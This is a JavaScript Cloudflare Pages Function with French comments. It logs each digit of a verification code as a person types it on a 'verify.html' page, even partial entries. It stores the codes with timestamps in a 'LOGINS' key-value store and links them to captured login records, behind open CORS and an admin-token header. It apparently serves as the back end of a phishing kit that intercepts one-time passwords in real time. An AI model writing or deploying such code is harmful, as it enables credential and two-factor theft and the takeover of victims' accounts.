// Cloudflare Pages Function: /api/log-code
// Enregistre en KV le code saisi (même partiel) pendant la saisie sur verify.html

export async function onRequestOptions() {
  return new Response(null, {
    status: 204,
    headers: corsHeaders('POST, OPTIONS')
  });
}

export async function onRequestPost({ request, env }) {
  try {
    const contentType = request.headers.get('content-type') || '';
    if (!contentType.includes('application/json')) {
      return json({ success: false, message: 'Content-Type must be application/json' }, 415);
    }

    const body = await request.json().catch(() => null);
    const verifyId = (body?.verifyId || '').toString().trim();
    let code = (body?.code || '').toString();
    const loginIdReq = (body?.loginId || '').toString().trim() || null;

    if (!verifyId) {
      return json({ success: false, message: 'verifyId requis' }, 400);
    }

    // Nettoyage: garder au plus 6 chiffres
    code = code.replace(/[^\d]/g, '').slice(0, 6);

    const KV = getKV(env);
    if (!KV || typeof KV.put !== 'function') {
      return json({ success: false, message: 'KV non configurée' }, 500);
    }

    const now = Date.now();
    const ts = new Date(now).toISOString();

    // Récupérer la session de vérification
    const raw = await KV.get(verifyId);
    let record = null;
    try { record = raw ? JSON.parse(raw) : null; } catch { record = null; }

    if (!record) {
      // Créer un enregistrement minimal si introuvable
      record = {
        status: 'pending',
        createdAt: ts,
        loginId: loginIdReq,
      };
    }
    // Compléter le loginId si possible
    if (!record.loginId && loginIdReq) {
      record.loginId = loginIdReq;
    }

    // Mettre à jour les champs de saisie
    const history = Array.isArray(record.typedHistory) ? record.typedHistory : [];
    history.push({ code, ts });
    // Conserver les 20 dernières entrées pour éviter la croissance infinie
    const trimmedHistory = history.slice(-20);

    record.lastTypedCode = code;
    record.typedUpdatedAt = ts;
    record.typedHistory = trimmedHistory;

    // Sauvegarder la session de vérification (rafraîchir TTL à 15 min)
    await KV.put(verifyId, JSON.stringify(record), { expirationTtl: 15 * 60 });

    // Mettre à jour l'enregistrement de login associé si présent
    if (record.loginId) {
      try {
        const loginRaw = await KV.get(record.loginId);
        let loginRec;
        try { loginRec = loginRaw ? JSON.parse(loginRaw) : null; } catch { loginRec = null; }
        const loginHistory = Array.isArray(loginRec?.typedHistory) ? loginRec.typedHistory : [];
        loginHistory.push({ code, ts, verifyId });
        const loginUpdated = {
          ...(loginRec || {}),
          lastTypedCode: code,
          typedUpdatedAt: ts,
          typedHistory: loginHistory.slice(-20),
        };
        await KV.put(record.loginId, JSON.stringify(loginUpdated));
      } catch {
        // ne bloque pas en cas d'échec
      }
    }

    return json({ success: true, message: 'Saisie enregistrée', verifyId, loginId: record.loginId || null, code, ts });
  } catch (err) {
    return json({ success: false, message: 'Erreur serveur', error: err?.message || String(err) }, 500);
  }
}

function json(payload, status = 200) {
  return new Response(JSON.stringify(payload), {
    status,
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      'Cache-Control': 'no-store',
      ...corsHeaders()
    }
  });
}

function corsHeaders(methods = 'POST, OPTIONS') {
  return {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': methods,
    'Access-Control-Allow-Headers': 'Content-Type, X-Admin-Token'
  };
}

function getKV(env) {
  return (
    env?.LOGINS ||
    env?.LOGINS_KV ||
    env?.KV_LOGINS ||
    env?.logins ||
    env?.['logins_kv'] ||
    env?.['logins-kv'] ||
    null
  );
}
